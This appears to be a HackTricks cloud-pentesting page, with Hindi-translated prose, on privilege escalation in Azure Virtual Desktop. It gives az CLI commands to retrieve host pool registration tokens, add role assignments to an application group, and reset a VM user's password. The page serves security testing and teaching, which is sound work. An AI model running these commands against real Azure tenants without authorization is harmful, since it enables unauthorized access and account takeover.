# Az - Virtual Desktop Privesx

{{#include ../../../banners/hacktricks-training.md}}

## Azure Virtual Desktop Privesc

### `Microsoft.DesktopVirtualization/hostPools/retrieveRegistrationToken/action`
आप होस्ट पूल के भीतर वर्चुअल मशीनों को पंजीकृत करने के लिए उपयोग किए जाने वाले पंजीकरण टोकन को प्राप्त कर सकते हैं।
```bash
az desktopvirtualization hostpool retrieve-registration-token -n testhostpool -g Resource_Group_1
```
### ("Microsoft.Authorization/roleAssignments/read", "Microsoft.Authorization/roleAssignments/write") && ("Microsoft.Compute/virtualMachines/read","Microsoft.Compute/virtualMachines/write","Microsoft.Compute/virtualMachines/extensions/read","Microsoft.Compute/virtualMachines/extensions/write")

इन अनुमतियों के साथ, आप एप्लिकेशन समूह में एक उपयोगकर्ता असाइनमेंट जोड़ सकते हैं, जो वर्चुअल डेस्कटॉप के वर्चुअल मशीन तक पहुँचने के लिए आवश्यक है।
```bash
az rest --method PUT \
--uri "https://management.azure.com/subscriptions/<SUBSCRIPTION_ID>/resourceGroups/<RESOURCE_GROUP_NAME>/providers/Microsoft.DesktopVirtualization/applicationGroups/<APP_GROUP_NAME>/providers/Microsoft.Authorization/roleAssignments/<NEW_ROLE_ASSIGNMENT_GUID>?api-version=2022-04-01" \
--body '{
"properties": {
"roleDefinitionId": "/subscriptions/<SUBSCRIPTION_ID>/providers/Microsoft.Authorization/roleDefinitions/1d18fff3-a72a-46b5-b4a9-0b38a3cd7e63",
"principalId": "<USER_OBJECT_ID>"
}
}'
```
इसके अलावा, आप वर्चुअल मशीन के उपयोगकर्ता और पासवर्ड को बदल सकते हैं ताकि आप इसमें पहुँच सकें।
```bash
az vm user update \
--resource-group <RESOURCE_GROUP_NAME> \
--name <VM_NAME> \
--username <USERNAME> \
--password <NEW_PASSWORD>
```
{{#include ../../../banners/hacktricks-training.md}}
